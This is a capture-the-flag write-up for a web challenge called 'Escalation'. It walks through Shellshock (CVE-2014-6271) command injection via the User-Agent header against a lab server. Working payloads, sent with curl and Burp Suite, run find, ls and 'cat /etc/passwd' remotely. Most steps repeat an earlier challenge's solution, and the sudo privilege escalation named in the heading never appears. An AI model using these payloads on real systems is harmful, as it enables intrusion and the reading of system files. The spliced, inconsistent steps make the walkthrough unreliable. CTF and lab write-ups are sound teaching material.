# Escalation

- **Category**: Web
- **Appearance conditions**: after solve Challenge `2014-6271`. 
- **Solution**: privillege escalation with inproper sudo command.

---
| Step | Screenshot |
|------|------------|
|1. Open the challenge and found the message *Do you find rootflag?*|<img width="505" height="241" alt="image" src="https://github.com/user-attachments/assets/fa0c75a4-4f1d-4ea6-b371-18752414068e" />|
|2. Try `find` *rootflag* in this server following the command.<br>`curl  -A "(){ :;}; /usr/bin/find / -type f -name *rootflag* 2>/dev/null " -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>Then found the *rootflag*.|<img width="826" height="358" alt="image" src="https://github.com/user-attachments/assets/d9f4c694-d18d-4d2a-abd2-3e7a8f172c48" />|
|3. Try show permission following the command.<br>`curl  -A "(){ :;}; /usr/bin/ls -la /tmp/hidden/access_denied/busted/rootflag.txt" -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>but only available to read with Root permission**Network Status Check** and **Admin Panel** look suspicious, so investigate them further.|<img width="600" height="220" alt="image" src="https://github.com/user-attachments/assets/1726e5e8-cbed-4f0c-b71f-255929ac9c42" />|
|4. Check the **Admin Panel**, but notice the hint in the message (a rabbit hole).|<img width="300" height="86" alt="image" src="https://github.com/user-attachments/assets/77e25117-736a-42ac-b135-d829464660a4" />|
|5. Examine the **Network Status Check**. It runs commands such as `ipconfig`, `ping`, etc.<br>But when checking carefully, the **User-Agent** field is empty.<br>➡️ Why is the User-Agent empty?|<img width="600" height="319" alt="image" src="https://github.com/user-attachments/assets/b2036adc-2a3d-45ea-877d-101b31f417c1" />|
|6. Notice the ***Challenge name: 2014-6271***.<br>Google the keyword ***2014-6271***, you find that it refers to the **[Shellshock vulnerability (CVE-2014-6271)](https://www.digicert.com/jp/blog/shellshock-cve-2014-6271https://www.digicert.com/jp/blog/shellshock-cve-2014-6271)**.<br>Further research shows the injection payload:<br>`(){ :; }; echo 'Hello World'`<br>Try it using **[Burp Suite](https://hwdream.com/burp_suite/)*** or ***curl***.|<img width="600" height="616" alt="image" src="https://github.com/user-attachments/assets/ad76e786-56e4-4dce-8ad0-57d4886be298" />|
|7. Test the injection with Burp Suite.<br>Turn **Intercept ON** and access the **Network Status Check** feature.|<img width="600" height="517" alt="image" src="https://github.com/user-attachments/assets/a857cb25-dc5b-4953-a94d-02b08885c7e9" />|
|8. Intercept the request and send it to [Repeater](https://www.issoh.co.jp/tech/details/3792/#Burp_Repeater).|<img width="600" height="450" alt="image" src="https://github.com/user-attachments/assets/b4479e3d-b5bf-4533-a046-ea76a3313605" />|
|9. Edit the **User-Agent** field with the following payload:<br>`() { :; }; /usr/bin/cat /etc/passwd`<br>Then send the request — ✅ it works!|<img width="600" height="578" alt="image" src="https://github.com/user-attachments/assets/90d8099e-517e-43da-8ede-6e1fbf2d8173" />|
|10. Search for the flag.<br>First, list the files in current dir:<br>`() { :; }; /usr/bin/ls -la ./*`<br>You found the **flag.txt** 🎉<br>Read it with:<br>`() { :; }; /usr/bin/cat flag.txt`<br>🎊 Congratulations!|<img width="858" height="422" alt="image" src="https://github.com/user-attachments/assets/edcb1e2d-1171-4c66-808f-000257b9f611" />|
